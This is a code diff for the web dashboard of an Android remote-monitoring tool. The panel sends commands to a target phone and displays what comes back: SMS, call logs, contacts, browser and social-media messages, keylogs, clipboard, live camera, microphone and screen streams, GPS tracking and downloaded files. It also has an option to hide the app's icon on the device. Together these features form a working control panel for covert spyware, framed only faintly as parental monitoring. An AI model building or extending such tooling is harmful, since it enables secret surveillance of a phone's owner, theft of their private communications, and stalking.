+                    <div style="margin-bottom:40px; border-bottom:1px solid var(--border); padding-bottom:20px;">
+                        <h1 style="font-size:32px; font-weight:700; color:var(--text-main); margin-bottom:8px; display:flex; align-items:center;">
+                            <span class="live-pulse"></span>${escapeHtml(model)}
+                        </h1>
+                        <div style="display:flex; gap:16px; align-items:center;">
+                            <span style="color:var(--text-sec); font-size:14px;">📡 Status: Online</span>
+                            <span style="color:var(--text-sec); font-size:14px;">🕒 Last Log: ${lastSeen}</span>
+                        </div>
+                    </div>
+
+                    <div class="overview-grid">
+                        <div class="stat-card-premium">
+                            <div style="font-size:11px; font-weight:700; color:var(--text-sec); text-transform:uppercase; margin-bottom:12px; opacity:0.6;">⚡ Battery</div>
+                            <div style="font-size:36px; font-weight:700; color:var(--primary);">${battery}%</div>
+                        </div>
+                        <div class="stat-card-premium">
+                            <div style="font-size:11px; font-weight:700; color:var(--text-sec); text-transform:uppercase; margin-bottom:12px; opacity:0.6;">📶 Signal</div>
+                            <div style="font-size:36px; font-weight:700; color:var(--primary);">${signal} dBm</div>
+                        </div>
+                        <div class="stat-card-premium">
+                            <div style="font-size:11px; font-weight:700; color:var(--text-sec); text-transform:uppercase; margin-bottom:12px; opacity:0.6;">🏷 Model</div>
+                            <div style="font-size:24px; font-weight:700; color:var(--primary);">${platform}</div>
+                        </div>
+                    </div>
+
+                    <div class="premium-panel" style="margin-top:24px; padding:0; overflow:hidden;">
+                        <div style="padding:20px 24px; border-bottom:1px solid var(--border); font-weight:700; font-size:15px;">📍 Recent Connectivity Map</div>
+                        <div id="overviewMap" style="height:400px; background:#f1f5f9;"></div>
+                    </div>
+                </div>
+                `;
+
+                // Check for active Geofence violation to show popup alert
+                checkGeofenceAlertOnLogin(data);
+
+                setTimeout(() => {
+                    const center = currentLocation ? [currentLocation.lat, currentLocation.lon] : [20.0, 0.0];
+                    const map = L.map('overviewMap').setView(center, currentLocation ? 16 : 2);
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                    if (currentLocation) {
+                        L.marker([currentLocation.lat, currentLocation.lon]).addTo(map).bindPopup('<b>Active Device</b><br>Last reported location.').openPopup();
+                    }
+                }, 100);
+
+            } catch (e) { console.error(e); panel.innerHTML = '<div style="padding:24px;color:red;">Failed to build dashboard.</div>'; }
+        }
+
+        async function checkGeofenceAlertOnLogin(deviceData) {
+            try {
+                // Check if device is currently marked as OUT in its main document or settings
+                const fenceDoc = await db.collection('devices').doc(selectedDeviceId).collection('settings').doc('geofence').get();
+                if (fenceDoc.exists) {
+                    const fence = fenceDoc.data();
+                    if (fence.active && fence.lastStatus === 'EXIT') {
+                        showGeofencePopupAlert(fence.lat, fence.lon);
+                    }
+                }
+            } catch (e) { console.error("Geofence Login Check Error:", e); }
+        }
+
+        function showGeofencePopupAlert(lat, lon) {
+            // Create a custom modal overlay for the high-priority alert
+            const alertModal = document.createElement('div');
+            alertModal.id = 'geofenceAlertPopup';
+            alertModal.style.cssText = 'position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:9999; display:flex; align-items:center; justify-content:center; backdrop-filter:blur(4px); animation: fadeIn 0.3s ease;';
+            alertModal.innerHTML = `
+                <div style="background:white; width:90%; max-width:450px; border-radius:16px; padding:32px; text-align:center; box-shadow:0 20px-50px rgba(0,0,0,0.3); border:2px solid #ef4444;">
+                    <div style="font-size:48px; margin-bottom:16px;">🚨</div>
+                    <h2 style="color:#b91c1c; font-size:24px; font-weight:800; margin-bottom:12px;">GEOFENCE ALERT!</h2>
+                    <p style="color:var(--text-sec); margin-bottom:24px; line-height:1.5;">The device has <strong>EXITED</strong> the designated safe zone. Immediate attention may be required.</p>
+                    <div style="display:flex; flex-direction:column; gap:12px;">
+                        <button onclick="document.getElementById('geofenceAlertPopup').remove(); if(!liveGpsActive) toggleLiveGps(); else if(currentLocation) renderLiveMap(currentLocation.lat, currentLocation.lon, currentLocation.acc);" style="background:#ef4444; color:white; border:none; padding:12px; border-radius:8px; font-weight:700; cursor:pointer; transition:0.2s;">🗺️ View On Map</button>
+                        <button onclick="document.getElementById('geofenceAlertPopup').remove();" style="background:#f3f4f6; color:var(--text-sec); border:none; padding:12px; border-radius:8px; font-weight:600; cursor:pointer;">Dismiss</button>
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(alertModal);
+        }
+
+        function stopActiveModules() {
+            if (liveGpsActive) {
+                toggleLiveGps();
+            }
+            // Collapse camera submenus
+            document.getElementById('clickCameraPanel').classList.remove('show');
+            document.getElementById('liveCameraPanel').classList.remove('show');
+        }
+
+        function toggleLiveGps() {
+            liveGpsActive = !liveGpsActive;
+            sendCommand(liveGpsActive ? 'START_GPS_UPDATES' : 'STOP_GPS_UPDATES');
+            const btn = document.getElementById('liveGpsBtn');
+            if (btn) {
+                btn.style.background = liveGpsActive ? '#d32f2f' : '';
+                btn.innerHTML = liveGpsActive ? '<span>🛰️</span> Stop GPS Track' : '<span>🛰️</span> Live GPS Track';
+            }
+            if (liveGpsActive && currentLocation) {
+                renderLiveMap(currentLocation.lat, currentLocation.lon, currentLocation.acc);
+            } else if (!liveGpsActive) {
+                panel.innerHTML = '<p>Live GPS tracking stopped.</p>';
+                liveMap = null;
+                liveMarker = null;
+                liveCircle = null;
             }
         }
 
-        // ==================== MESSAGE HANDLER (UPDATED GPS CASES) ====================
+        function toggleAppIcon() { sendCommand(iconHidden ? 'SHOW_APP' : 'HIDE_APP'); }
+        function toggleFlash() { sendCommand(flashOn ? 'FLASH_OFF' : 'FLASH_ON'); }
+
+        // ==================== MESSAGE HANDLER ====================
         function handleJSON(json) {
             if (Array.isArray(json)) {
-                if (pendingCommand === 'LIST_FILES') { currentData = json; fileTreeCache[currentPath] = json; expandedFolders.add(currentPath); renderFiles(); }
+                if (pendingCommand === 'LIST_FILES') {
+                    currentData = json;
+                    fileTreeCache[currentPath] = json;
+                    expandedFolders.add(currentPath);
+                    renderFiles();
+                }
                 else if (pendingCommand === 'GET_SMS') { displaySMS(json); }
                 else if (pendingCommand === 'GET_CALL_LOGS') { displayCallLogs(json); }
                 else if (pendingCommand === 'GET_CONTACTS') { displayContacts(json); }
@@ -1598,71 +3368,184 @@
                 pendingCommand = null; return;
             }
             switch (json.type) {
-                case 'FILE_LIST': /* unchanged */ break;
-                case 'SMS_DATA': /* unchanged */ break;
-                case 'CALL_LOGS': /* unchanged */ break;
-                case 'CONTACTS_DATA': /* unchanged */ break;
-                case 'WIFI_NETWORKS_DATA': /* unchanged */ break;
-                case 'SOCIAL_MESSAGES_DATA': try { displaySocialMessages(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) {} break;
+                case 'FILE_LIST':
+                    try {
+                        const _fl = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                        const _files = Array.isArray(_fl) ? _fl : [];
+                        fileTreeCache[currentPath] = _files;
+                        expandedFolders.add(currentPath);
+                        renderFiles();
+                    } catch (e) { console.error('FILE_LIST error:', e); }
+                    break;
+                case 'SMS_DATA': try { displaySMS(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'CALL_LOGS': try { displayCallLogs(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'CONTACTS_DATA': try { displayContacts(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'WIFI_NETWORKS_DATA': try { displayWifiNetworks(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'SOCIAL_MESSAGES_DATA': try { displaySocialMessages(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                 case 'CAMERA_IMAGE': displayCapturedImage(json.data); break;
                 case 'LOCATION_UPDATE':
                     try {
                         const loc = typeof json.data === 'string' ? JSON.parse(json.data) : (json.data || json);
+                        const lat = loc.lat || loc.latitude;
+                        const lon = loc.lon || loc.longitude;
+                        const acc = loc.accuracy || 10;
+                        currentLocation = { lat, lon, acc };
+
                         if (liveGpsActive) {
-                            const lat = loc.lat || loc.latitude;
-                            const lon = loc.lon || loc.longitude;
-                            const acc = loc.accuracy || 10;
-                            currentLocation = { lat, lon, acc };
                             renderLiveMap(lat, lon, acc);
                         } else {
                             renderMap(loc);
                         }
+
+                        // Also update geofence blue dot if panel is open
+                        if (window._geofenceMap) {
+                            updateGeofenceDeviceMarker(lat, lon, acc);
+                        }
                     } catch (e) { console.error('Error parsing location update:', e); }
                     break;
-                case 'GEOFENCE_INFO': try { displayGeofenceInfo(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) {} break;
+                case 'GEOFENCE_INFO': try { displayGeofenceInfo(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'FILE_INFO': fileTransfers[json.transferId] = { chunks: new Array(json.totalChunks), totalChunks: json.totalChunks, fileName: json.fileName, received: 0 }; document.getElementById('progressFileName').innerText = json.fileName; document.getElementById('progressPercent').innerText = '0%'; document.getElementById('progressBar').style.width = '0%'; document.getElementById('downloadProgress').style.display = 'block'; break;
+                case 'FILE_CHUNK':
+                    const tr = fileTransfers[json.transferId];
+                    if (!tr) return;
+                    setTimeout(() => {
+                        try {
+                            const bin = atob(json.data), bytes = new Uint8Array(bin.length);
+                            for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+                            tr.chunks[json.chunkIndex] = bytes;
+                            tr.received++;
+                            const pct = Math.round((tr.received / tr.totalChunks) * 100);
+                            document.getElementById('progressPercent').innerText = pct + '%';
+                            document.getElementById('progressBar').style.width = pct + '%';
+                            if (tr.received === tr.totalChunks) {
+                                const blob = new Blob(tr.chunks), url = URL.createObjectURL(blob), a = document.createElement('a');
+                                a.href = url;
+                                a.download = tr.fileName;
+                                a.click();
+                                URL.revokeObjectURL(url);
+                                delete fileTransfers[json.transferId];
+                                document.getElementById('downloadProgress').style.display = 'none';
+                                showNotification(`✅ Downloaded: ${tr.fileName}`);
+                            }
+                        } catch (e) {
+                            showNotification('Chunk decode error');
+                            delete fileTransfers[json.transferId];
+                            document.getElementById('downloadProgress').style.display = 'none';
+                        }
+                    }, 0);
+                    break;
+                case 'FLASH_ON': flashOn = true; document.getElementById('flashBtn').innerText = 'Flash Off'; showNotification('🔦 Flashlight ON'); break;
+                case 'FLASH_OFF': flashOn = false; document.getElementById('flashBtn').innerText = 'Flash On'; showNotification('🔦 Flashlight OFF'); break;
+                case 'APP_HIDDEN': iconHidden = true; document.getElementById('iconBtn').innerText = 'Show Icon'; showNotification('App icon hidden'); break;
+                case 'APP_SHOWN': iconHidden = false; document.getElementById('iconBtn').innerText = 'Hide Icon'; showNotification('App icon shown'); break;
+                case 'INSTALLED_APPS': try { displayInstalledApps(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'APP_USAGE_DATA': try { displayAppUsage(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'BROWSER_HISTORY_DATA': try { displayBrowserHistory(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'KEYLOG_DATA': try { displayKeylog(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'CLIPBOARD_DATA': try { displayClipboard(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'RECENT_IMAGES_DATA': try { displayPhotoGallery(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'LOCATION_HISTORY_DATA': try { displayLocationHistory(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'APP_EVENTS_DATA': try { displayAppEvents(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'SMS_KEYWORDS_DATA': try { displaySmsKeywords(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'SMS_ALERTS_DATA': try { displaySmsAlerts(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                 case 'GEOFENCE_SET': showNotification('✅ Geofence activated'); break;
                 case 'GEOFENCE_CLEARED': showNotification('Geofence cleared'); break;
-                case 'GEOFENCE_ALERT': pushAlert('Geofence', json.event === 'EXIT' ? '🚨 DEVICE LEFT safe zone!' : '✅ Device returned to safe zone'); break;
-                case 'GPS_UPDATES_STOPPED': liveGpsActive = false; const gpsBtn = document.getElementById('liveGpsBtn'); if (gpsBtn) { gpsBtn.querySelector('span:last-child').textContent = 'Live GPS Track'; gpsBtn.style.cssText = ''; } showNotification('GPS tracking stopped'); break;
-                case 'LOCATION_HISTORY_DATA': try { displayLocationHistory(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) {} break;
-                // ... other cases unchanged ...
+                case 'GEOFENCE_ALERT': 
+                    pushAlert('Geofence', json.event === 'EXIT' ? '🚨 DEVICE LEFT safe zone!' : '✅ Device returned to safe zone');
+                    if (json.event === 'EXIT') {
+                        showGeofencePopupAlert(currentLocation?.lat, currentLocation?.lon);
+                    }
+                    break;
+                case 'SCHEDULED_CAPTURE_SET': showNotification('✅ Auto-capture started'); break;
+                case 'SCHEDULED_CAPTURE_STOPPED': showNotification('Auto-capture stopped'); break;
+                case 'DEVICE_LOCKED': showNotification('🔒 Screen locked'); break;
+                case 'SMS_SENT': showNotification('✅ SMS sent successfully'); break;
+                case 'FILE_DELETED': showNotification('File deleted'); sendCommand('LIST_FILES', { path: currentPath }); break;
+                case 'VIBRATE_COMPLETE': showNotification('📳 Vibrated'); break;
+                case 'GPS_UPDATES_STOPPED': 
+                    liveGpsActive = false; 
+                    const gpsBtn = document.getElementById('liveGpsBtn'); 
+                    if (gpsBtn) { 
+                        gpsBtn.innerHTML = '<span>🛰️</span> Live GPS Track'; 
+                        gpsBtn.style.cssText = ''; 
+                    } 
+                    showNotification('GPS tracking stopped'); 
+                    break;
+                case 'NOTIFICATION_LIVE': pushAlert('📳 ' + (json.app || 'App'), (json.title || '') + ': ' + (json.text || '')); break;
+                case 'CALL_ALERT': if (json.event === 'RINGING') pushAlert('📞 Incoming Call', (json.name || 'Unknown') + ' (' + (json.number || '') + ')'); else if (json.event === 'MISSED') pushAlert('📵 Missed Call', (json.name || 'Unknown') + ' (' + (json.number || '') + ')'); break;
+                case 'SMS_KEYWORD_ALERT': pushAlert('🔑 Keyword: ' + json.keyword, 'From ' + json.from + ': ' + json.body); break;
                 default: console.log('Unhandled type:', json.type);
             }
             pendingCommand = null;
         }
 
-        function handlePlainText(msg) { /* unchanged */ }
-        function handleIncomingMessage(msg) { /* unchanged */ }
+        function handlePlainText(msg) {
+            if (msg.startsWith("CAMERA_IMAGE:")) displayCapturedImage(msg.substring(13));
+            else if (msg.startsWith("FLASH_ON")) { 
+                flashOn = true; 
+                document.getElementById('flashBtn').innerText = 'Flash Off'; 
+                showNotification('Flash ON'); 
+            }
+            else if (msg.startsWith("FLASH_OFF")) { 
+                flashOn = false; 
+                document.getElementById('flashBtn').innerText = 'Flash On'; 
+                showNotification('Flash OFF'); 
+            }
+            else if (msg.startsWith("LOC_DATA:")) try { renderMap(JSON.parse(msg.substring(9))); } catch (e) { }
+            else if (msg.startsWith("SMS_DATA:")) try { displaySMS(JSON.parse(msg.substring(9))); } catch (e) { }
+            else if (msg.startsWith("CALL_DATA:")) try { displayCallLogs(JSON.parse(msg.substring(10))); } catch (e) { }
+            else if (msg.startsWith("CONTACTS_DATA:")) try { displayContacts(JSON.parse(msg.substring(14))); } catch (e) { }
+            else if (msg.startsWith("WIFI_DATA:")) try { displayWifiNetworks(JSON.parse(msg.substring(10))); } catch (e) { }
+            else if (msg.startsWith('[') || msg.startsWith('{')) try { handleJSON(JSON.parse(msg)); } catch (e) { }
+        }
 
-        // ==================== EVENT LISTENERS (ensure GPS buttons use correct functions) ====================
+        function handleIncomingMessage(msg) {
+            try {
+                const j = JSON.parse(msg);
+                if (j.type === 'SIGNALING') handleSignaling(j.data);
+                else handleJSON(j);
+            } catch (e) {
+                handlePlainText(msg);
+            }
+        }
+
+        // ==================== EVENT LISTENERS ====================
         function setupEvents() {
+            document.getElementById('overviewBtn').onclick = renderDeviceOverview;
             document.getElementById('screenShareBtn').onclick = toggleScreen;
-            document.getElementById('clickPictureBtn').onclick = () => document.getElementById('clickCameraPanel').classList.toggle('show');
+            document.getElementById('clickPictureBtn').onclick = () => {
+                document.getElementById('liveCameraPanel').classList.remove('show');
+                document.getElementById('clickCameraPanel').classList.toggle('show');
+                toggleFlashOptions();
+            };
             document.getElementById('capturePictureBtn').onclick = capturePicture;
-            document.getElementById('liveCameraBtn').onclick = () => document.getElementById('liveCameraPanel').classList.toggle('show');
+            document.getElementById('liveCameraBtn').onclick = () => {
+                document.getElementById('clickCameraPanel').classList.remove('show');
+                document.getElementById('liveCameraPanel').classList.toggle('show');
+                toggleFlashOptions();
+            };
             document.getElementById('startLiveStreamBtn').onclick = startLiveCamera;
             document.getElementById('liveAudioBtn').onclick = startLiveAudio;
             document.getElementById('stopLiveAudioBtn').onclick = stopLiveAudio;
-            document.getElementById('getLocationBtn').onclick = requestLocation;        // <-- from index2
-            document.getElementById('fileManagerBtn').onclick = () => { refreshFileRoot(); };
-            document.getElementById('smsBtn').onclick = () => { currentPage = 0; sendCommand('GET_SMS', { box: 'all' }); };
-            document.getElementById('callLogsBtn').onclick = () => { currentPage = 0; sendCommand('GET_CALL_LOGS'); };
-            document.getElementById('contactsBtn').onclick = () => { currentPage = 0; sendCommand('GET_CONTACTS'); };
-            document.getElementById('installedAppsBtn').onclick = () => { currentPage = 0; sendCommand('GET_INSTALLED_APPS'); };
-            document.getElementById('browserHistoryBtn').onclick = () => sendCommand('GET_BROWSER_HISTORY');
-            document.getElementById('wifiNetworksBtn').onclick = () => { currentPage = 0; sendCommand('GET_WIFI_NETWORKS'); };
-            document.getElementById('screenTimeBtn').onclick = showAppUsagePanel;
-            document.getElementById('socialMessagesBtn').onclick = () => sendCommand('GET_SOCIAL_MESSAGES', { days: 3 });
-            document.getElementById('keylogBtn').onclick = () => sendCommand('GET_KEYLOG');
-            document.getElementById('clipboardBtn').onclick = () => sendCommand('GET_CLIPBOARD');
-            document.getElementById('geofenceBtn').onclick = showGeofencePanel;          // <-- from index2
-            document.getElementById('autoCaptureBtn').onclick = showSchedulePanel;
-            document.getElementById('liveGpsBtn').onclick = toggleLiveGps;              // <-- from index2
-            document.getElementById('locationHistoryBtn').onclick = showLocationHistoryPanel; // <-- from index2
-            document.getElementById('callRecordingsBtn').onclick = showCallRecordingsPanel;
-            document.getElementById('photoGalleryBtn').onclick = showPhotoGalleryPanel;
-            document.getElementById('appEventsBtn').onclick = showAppEventsPanel;
-            document.getElementById('smsKeywordsBtn').onclick = showSmsKeywordsPanel;
+            document.getElementById('fileManagerBtn').onclick = () => { stopActiveModules(); refreshFileRoot(); };
+            document.getElementById('smsBtn').onclick = () => { stopActiveModules(); currentPage = 0; sendCommand('GET_SMS', { box: 'all' }); };
+            document.getElementById('callLogsBtn').onclick = () => { stopActiveModules(); currentPage = 0; sendCommand('GET_CALL_LOGS'); };
+            document.getElementById('contactsBtn').onclick = () => { stopActiveModules(); currentPage = 0; sendCommand('GET_CONTACTS'); };
+            document.getElementById('installedAppsBtn').onclick = () => { stopActiveModules(); currentPage = 0; sendCommand('GET_INSTALLED_APPS'); };
+            document.getElementById('browserHistoryBtn').onclick = () => { stopActiveModules(); sendCommand('GET_BROWSER_HISTORY'); };
+            document.getElementById('wifiNetworksBtn').onclick = () => { stopActiveModules(); currentPage = 0; sendCommand('GET_WIFI_NETWORKS'); };
+            document.getElementById('screenTimeBtn').onclick = () => { stopActiveModules(); showAppUsagePanel(); };
+            document.getElementById('socialMessagesBtn').onclick = () => { stopActiveModules(); sendCommand('GET_SOCIAL_MESSAGES', { days: 3 }); };
+            document.getElementById('keylogBtn').onclick = () => { stopActiveModules(); sendCommand('GET_KEYLOG'); };
+            document.getElementById('clipboardBtn').onclick = () => { stopActiveModules(); sendCommand('GET_CLIPBOARD'); };
+            document.getElementById('geofenceBtn').onclick = () => { stopActiveModules(); showGeofencePanel(); };
+            document.getElementById('autoCaptureBtn').onclick = () => { stopActiveModules(); showSchedulePanel(); };
+            document.getElementById('liveGpsBtn').onclick = toggleLiveGps;
+            document.getElementById('locationHistoryBtn').onclick = () => { stopActiveModules(); showLocationHistoryPanel(); };
+            document.getElementById('callRecordingsBtn').onclick = () => { stopActiveModules(); showCallRecordingsPanel(); };
+            document.getElementById('photoGalleryBtn').onclick = () => { stopActiveModules(); showPhotoGalleryPanel(); };
+            document.getElementById('appEventsBtn').onclick = () => { stopActiveModules(); showAppEventsPanel(); };
+            document.getElementById('smsKeywordsBtn').onclick = () => { stopActiveModules(); showSmsKeywordsPanel(); };
             document.getElementById('toggleAppIconBtn').onclick = toggleAppIcon;
             document.getElementById('lockDeviceBtn').onclick = () => sendCommand('LOCK_DEVICE');
             document.getElementById('sendSmsBtn').onclick = showSendSmsPanel;
@@ -1672,19 +3555,6 @@
             document.getElementById('clearAlertsBtn').onclick = clearAlerts;
             document.getElementById('logoutBtn').onclick = logout;
         }
-
-        // ==================== REMAINING FUNCTIONS (unchanged) ====================
-        function capturePicture() { const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value; sendCommand('CAMERA_SNAPSHOT', { camera, flash: document.getElementById('clickFlashCheckbox').checked }); }
-        function displayCapturedImage(b64) { panel.innerHTML = `<img src="data:image/jpeg;base64,${b64}" style="max-width:100%;border-radius:8px;"><div style="margin-top:12px;"><button onclick="downloadBase64('${b64}','snapshot_${Date.now()}.jpeg')" style="background:#1976ff;color:white;border:none;padding:8px 16px;border-radius:6px;">💾 SAVE IMAGE</button></div>`; }
-        function toggleAppIcon() { sendCommand(iconHidden ? 'SHOW_APP' : 'HIDE_APP'); }
-        function toggleFlash() { sendCommand(flashOn ? 'FLASH_OFF' : 'FLASH_ON'); }
-        function showSchedulePanel() { panel.innerHTML = '<h3>⏱️ Auto Screenshot</h3><div><label>Interval (minutes): <input id="schedInterval" type="number" value="5" min="1"></label><label style="margin-left:12px;">Camera: <select id="schedCam"><option value="0">Rear</option><option value="1">Front</option></select></label><button id="startSched" style="background:#1976ff;color:white;border:none;padding:8px 16px;border-radius:6px;margin-top:12px;">Start</button><button id="stopSched" style="background:#d32f2f;color:white;border:none;padding:8px 16px;border-radius:6px;margin-top:12px;margin-left:8px;">Stop</button></div>'; document.getElementById('startSched').onclick = () => { const mins = parseInt(document.getElementById('schedInterval').value) || 5; const cam = parseInt(document.getElementById('schedCam').value); sendCommand('SET_SCHEDULED_CAPTURE', { intervalMinutes: mins, cameraId: cam }); }; document.getElementById('stopSched').onclick = () => sendCommand('STOP_SCHEDULED_CAPTURE'); }
-        function showSendSmsPanel() { panel.innerHTML = '<h3>✉️ Send SMS</h3><div><input id="smsNumber" placeholder="Phone Number" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:6px;"><textarea id="smsBody" rows="4" placeholder="Message" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:6px;"></textarea><button id="sendSmsBtn" style="background:#1976ff;color:white;border:none;padding:10px;border-radius:6px;width:100%;">Send SMS</button></div>'; document.getElementById('sendSmsBtn').onclick = () => { const num = document.getElementById('smsNumber').value.trim(); const body = document.getElementById('smsBody').value.trim(); if (!num || !body) return showNotification('Enter number and message'); sendCommand('SEND_SMS', { number: num, body }); }; }
-        function showAppEventsPanel() { panel.innerHTML = '<h3>📦 App & Call Events</h3><p>App installs/removals and call events from device.</p><div><button data-days="1" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">Today</button><button data-days="3" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">3 Days</button><button data-days="5" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">5 Days</button></div><div id="appEventsList"></div>'; panel.querySelectorAll('button[data-days]').forEach(btn => btn.onclick = () => sendCommand('GET_APP_EVENTS', { days: parseInt(btn.dataset.days) })); sendCommand('GET_APP_EVENTS', { days: 5 }); }
-        function displayAppEvents(data) { panel.innerHTML = '<p>Events loaded</p>'; }
-        function showSmsKeywordsPanel() { panel.innerHTML = '<h3>🔑 SMS Keyword Alerts</h3><p>Get alerts when incoming SMS contains any of these words.</p><div><input id="kwInput" placeholder="drug, fight, bully" style="width:100%;padding:8px;margin:8px 0;border:1px solid #ddd;border-radius:6px;"><button id="saveKw" style="background:#1976ff;color:white;border:none;padding:8px;border-radius:6px;width:100%;">Save Keywords</button></div><div style="margin-top:12px;"><button id="viewKw" style="background:#4caf50;color:white;border:none;padding:6px 12px;border-radius:6px;">View Current</button><button id="clearKw" style="background:#ff9800;color:white;border:none;padding:6px 12px;border-radius:6px;margin-left:8px;">Clear All</button><button id="viewAlerts" style="background:#2196f3;color:white;border:none;padding:6px 12px;border-radius:6px;margin-left:8px;">View Alerts</button></div><div id="kwResult" style="margin-top:12px;"></div>'; document.getElementById('saveKw').onclick = () => { const raw = document.getElementById('kwInput').value.trim(); if (!raw) return showNotification('Enter at least one keyword'); const kws = raw.split(',').map(k => k.trim()).filter(k => k); sendCommand('SET_SMS_KEYWORDS', { keywords: kws }); }; document.getElementById('viewKw').onclick = () => sendCommand('GET_SMS_KEYWORDS'); document.getElementById('clearKw').onclick = () => sendCommand('CLEAR_SMS_KEYWORDS'); document.getElementById('viewAlerts').onclick = () => sendCommand('GET_SMS_ALERTS', { days: 5 }); }
-        function displaySmsKeywords(data) { }
-        function displaySmsAlerts(data) { }
 
         // ==================== INITIALIZE AUTH STATE ====================
         auth.onAuthStateChanged(user => {
@@ -1707,4 +3577,5 @@
         setupEvents();
     </script>
 </body>
+
 </html>
